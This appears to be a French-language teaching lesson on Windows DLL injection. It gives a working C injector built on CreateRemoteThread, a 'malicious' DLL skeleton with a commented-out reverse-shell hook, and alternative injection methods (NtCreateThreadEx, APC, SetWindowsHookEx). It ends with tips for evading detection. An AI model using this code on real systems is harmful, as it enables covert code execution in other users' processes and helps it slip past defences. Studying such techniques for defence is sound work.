# Cours 02 : DLL Injection

## Principe

L'injection de DLL consiste à forcer un processus cible à charger notre DLL.

```
┌─────────────────────────────────────────────────────────────────┐
│  PROCESSUS D'INJECTION                                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Ouvrir le processus cible                                  │
│  2. Allouer de la mémoire dans ce processus                    │
│  3. Écrire le chemin de la DLL dans cette mémoire             │
│  4. Créer un thread qui appelle LoadLibrary                    │
│  5. Le thread charge notre DLL → DllMain est exécuté          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Injection Classique (CreateRemoteThread)

```c
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char *dllPath) {
    // 1. Ouvrir le processus
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    if (!hProcess) return FALSE;

    // 2. Allouer mémoire pour le chemin
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!remotePath) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // 3. Écrire le chemin
    if (!WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL)) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. Obtenir l'adresse de LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    // 5. Créer le thread distant
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        remotePath, 0, NULL
    );
    if (!hThread) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 6. Attendre la fin
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyer
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}
```

## DLL Malveillante

```c
// malicious.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Code exécuté lors du chargement
            MessageBoxA(NULL, "DLL Injectée!", "Info", MB_OK);

            // Ou lancer un reverse shell...
            // CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            // Nettoyage
            break;
    }
    return TRUE;
}
```

## Autres Techniques

### NtCreateThreadEx

```c
// Plus discret que CreateRemoteThread
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
);

pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"
);

NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
    pLoadLibrary, remotePath, FALSE, 0, 0, 0, NULL);
```

### QueueUserAPC

```c
// Injection via APC (Asynchronous Procedure Call)
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)remotePath);
// Le code est exécuté quand le thread entre en état alertable
```

### SetWindowsHookEx

```c
// Injection via hook Windows
HHOOK hook = SetWindowsHookEx(
    WH_KEYBOARD,           // Type de hook
    KeyboardProc,          // Notre fonction
    hDllModule,            // Notre DLL
    0                      // Tous les threads
);
// La DLL est chargée dans tous les processus avec des fenêtres
```

## Détection et Contremesures

```
Détections courantes :
- Surveillance de CreateRemoteThread
- Vérification des DLL chargées
- Hooks sur LoadLibrary
- Surveillance de la mémoire RWX

Contremesures offensives :
- Utiliser des techniques alternatives (APC, hooks)
- Injection de shellcode au lieu de DLL
- Manual mapping (charger la DLL manuellement)
- Syscalls directs
```
